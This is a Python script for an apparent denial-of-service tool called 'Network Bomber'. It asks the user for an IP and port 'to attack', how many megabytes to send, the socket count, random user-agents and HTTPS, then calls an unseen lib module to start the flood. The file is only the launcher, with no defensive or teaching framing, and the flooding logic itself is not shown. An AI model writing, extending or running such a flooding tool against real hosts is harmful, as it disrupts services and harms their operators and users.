import lib

TEXT = '''  _   _ ______ _________          ______  _____  _  __   ____   ____  __  __ ____  ______ _____  
 | \ | |  ____|__   __\ \        / / __ \|  __ \| |/ /  |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
 |  \| | |__     | |   \ \  /\  / / |  | | |__) | ' /   | |_) | |  | | \  / | |_) | |__  | |__) |
 | . ` |  __|    | |    \ \/  \/ /| |  | |  _  /|  <    |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
 | |\  | |____   | |     \  /\  / | |__| | | \ \| . \   | |_) | |__| | |  | | |_) | |____| | \ \ 
 |_| \_|______|  |_|      \/  \/   \____/|_|  \_\_|\_\  |____/ \____/|_|  |_|____/|______|_|  \_\
                                                                                                 
                                                                                                 '''

def extra_options_():
    socket_num = int(input("How many socket do you want to send(max 400 recomeed)> "))
    lib.socket_num = socket_num
    verbose = input("Do you want a detailed request?(y/n)> ")
    if 'y' in verbose.lower():
        lib.verbose = True
    else:
        lib.verbose = False
    random_ua = input("Do you want randomize the choice of the user-agents?(y/n)")
    if 'y' in random_ua.lower():
        lib.random_ua = True
    else:
        lib.random_ua = False
    use_https = input("Do you want to use the https protocol?(y/n)")
    if 'y' in use_https.lower():
        lib.use_https = True
    else:
        lib.use_https = False
    sleeptime = float(input("Sleeptime(float allowed)> "))   
                                                                                    
print(TEXT)
ip = input("Ip to attack> ")
lib.ip_addr = ip
port = int(input(f"Port to attack {ip}> "))
lib.port = port
mb = int(input("Megabytes to send(NO FLOAT example: 1.3)>  "))
lib.data_to_send_in_mb = mb
extra_options = input("Do you want additional options?(y/n)> ")
if 'y' in extra_options.lower():
    extra_options_()
    lib.start()
else:
    print("Attack started.\n_________________________________________\n")
    lib.start()
        